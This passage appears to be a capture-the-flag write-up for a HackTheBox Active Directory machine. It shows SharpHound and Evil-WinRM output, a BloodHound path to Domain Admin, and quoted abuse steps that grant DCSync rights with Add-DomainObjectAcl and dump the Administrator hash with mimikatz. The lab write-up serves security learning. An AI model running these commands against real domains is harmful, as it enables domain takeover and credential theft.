Enumeration finished in 00:00:02.4093629
Compressing data to .\20201229061035_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 6:10 AM on 12/29/2020! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls

    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/29/2020   6:10 AM          15170 20201229061035_BloodHound.zip
-a----       12/29/2020   5:54 AM        1309448 mimikatz.exe
-a----       12/29/2020   6:10 AM          23611 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----       12/29/2020   6:06 AM         833024 SharpHound.exe
-ar---        9/23/2019   2:16 PM             32 user.txt
-a----       12/29/2020   5:45 AM         242176 winPEAS.exe

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> download 20201229061035_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Desktop\20201229061035_BloodHound.zip to 20201229061035_BloodHound.zip
                                                             
Info: Download successful!
```
Map the shortest path to Domain Admin from the owned account.
(!screenshot)
The owned account is an inherent member of the account operators group which has GenericAll privileges to the Exchange Windows Permissions group, which has WriteDACL permissions to the domain.
Abuse info from BloodHound:
  
*To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
  
You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):*
```shell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
```
*Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:*
```shell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```
*Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain*
```shell
lsadump::dcsync /domain:testlab.local /user:Administrator
```
*Cleanup can be done using the Remove-DomainObjectAcl function:*
```shell
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```
